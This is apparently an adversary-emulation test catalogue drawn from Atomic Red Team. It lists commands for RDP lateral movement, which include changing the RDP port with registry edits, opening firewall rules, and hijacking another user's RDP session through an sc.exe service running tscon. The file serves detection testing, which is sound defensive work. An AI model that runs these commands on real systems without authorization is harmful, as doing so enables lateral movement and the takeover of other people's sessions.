scripts.name: ART - T1021.001 - RDP to DomainController
scripts.description: Attempt an RDP session via Remote Desktop Application to a DomainController.
scripts.cleanup_command:
$p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell
scripts.name: ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell
scripts.description: Changing RDP Port to Non Standard Port via Powershell
scripts.technique_name: Changing RDP Port to Non Standard Port via Powershell
scripts.command:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{art_lateral_1021_001_new_remote_port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{art_lateral_1021_001_new_remote_port}
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt
scripts.name: ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt
scripts.description: Changing RDP Port to Non Standard Port via Command_Prompt
scripts.technique_name: Changing RDP Port to Non Standard Port via Command_Prompt
scripts.command:
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{art_lateral_1021_001_new_remote_port} /f
netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{art_lateral_1021_001_new_remote_port}
scripts.cleanup_command:
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{art_lateral_1021_001_old_remote_port} /f >nul 2>&1
netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
net stop TermService /y >nul 2>&1
net start TermService >nul 2>&1
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.name: ART - T1563.002 - RDP hijacking
scripts.description: [RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization
scripts.command:
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon #{art_lateral_1563_002_session_id} /dest:#{art_lateral_1563_002_destination_id}"
net start sesshijack
scripts.detection_rule: See MITRE ATT&CK page for detection guidance
